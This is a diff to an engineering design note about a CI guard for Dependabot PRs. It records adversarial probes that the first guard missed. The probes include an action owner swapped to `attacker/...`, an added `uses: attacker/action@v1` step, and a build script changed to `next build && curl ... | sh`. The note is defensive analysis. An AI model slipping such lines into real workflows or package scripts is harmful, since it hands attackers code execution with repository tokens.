@@ -116,10 +116,48 @@ never for restriction.** That is the same defect as sampling mutations only from
 inside the region the tests already cover: both produce a confident green from a
 population that could not have gone red.
 
-Both halves now:
+**And the first version of THIS SECTION committed the same error it names.**
+Its whole evidence for "restriction" was one planted `continue-on-error` line —
+which is not a `uses:` line at all, so it sits entirely **outside** the admitted
+language. It established that the guard refuses obviously foreign content. It
+never tested whether the admitted language is narrow, which is the only question
+that matters. Adversarial review found three real holes living inside it, and all
+three measured **exit 0**.
 
-    all four real PRs, real diffs                       -> exit 0
-    #465's real diff + one planted continue-on-error    -> exit 1
+Six probes, measured 2026-09-23, three of them attacks the first guard passed:
+
+    all four real bot PRs, real diffs                    -> exit 0
+    a real `uses:` bump PAIR (-@v4 / +@v7)               -> exit 0
+    a real dependency bump in a package.json             -> exit 0
+    OWNER SWAP  -gitleaks/... / +attacker/...            -> exit 1   (was 0)
+    LONE ADDED  +uses: attacker/action@v1, no removal    -> exit 1   (was 0)
+    package.json "build": "next build && curl ... | sh"  -> exit 1   (was 0)
+    a content-judged path with no --diff                 -> exit 2
+    a `.github/` diff with ZERO changed content lines    -> exit 2
+
+Two mechanisms behind the three zeros.
+
+**A bump is a PAIR, and the regex checked a line SHAPE.** Same `owner/repo`
+removed and added, with different refs — a property of the whole hunk, which no
+single-line pattern can express. So an owner swap matched twice and a lone added
+step matched once, and both read as "every changed line is a `uses:` bump".
+`ci.yml`'s gitleaks step is exactly the shape: swapping only the owner leaves its
+`env:` block out of the diff entirely, and the job carries `pull-requests: write`.
+Dependabot's token is read-only while the PR is open, so the escalation is that
+the line **merges**, after which every human-triggered run executes it with the
+full token.
+
+**`package.json` was judged by PATH**, under "a dependency manifest has no
+authority over anything except which versions install". `ci.yml` falsifies that: it
+runs `format:check`, `lint`, `typecheck`, `test` and `build`, every one a script
+defined in a `package.json`. A commit on a bot branch turning `"build": "next
+build"` into `"next build && …"` kept `user.login == dependabot[bot]` and passed.
+
+**The lesson generalises past this guard, and it is the third instance of one
+root.** Sampling mutations only from inside the covered region; validating an
+allow-list only against benign traffic; and — on #209 the same night — seeding a
+Postgres fixture with the one spelling the filter under test already agreed with.
+All three are *a test whose input was chosen by the thing under test*. See D-084.
 
 ### What the four actually touch, by file rather than by category
 
